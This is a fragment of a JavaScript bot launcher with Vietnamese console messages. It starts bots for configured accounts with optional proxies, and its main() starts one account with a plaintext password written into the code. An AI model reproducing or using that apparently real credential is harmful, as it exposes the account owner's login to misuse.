            console.log("\x1b[33m  BẤM CTRL + C ĐỂ DỪNG TOÀN BỘ CHƯƠNG TRÌNH         \x1b[0m");
            console.log("\x1b[33m====================================================\x1b[0m\n");

            selectedAccounts.forEach(acc => {
                const accConfig = config.Accounts[acc];
                console.log(`-> Starting: ${acc} | Proxy: ${accConfig.proxy.enable ? accConfig.proxy.ip : "Không dùng"}`);
                startBot(acc, accConfig);
            });

            return "START_BOTS";
        }
    }
    else {
        lastError = `Lệnh '${command}' không tồn tại! Nhập 'Help' để xem danh sách các lệnh.`;
    }
    return null;
}

async function main() {
    startBot("syntax", {
        "pass": "Kpc5519A",
        "proxy": {
            "enable": false,
            "ip": "127.0.0.1",
            "port": 9097
        }
    })
}

main();
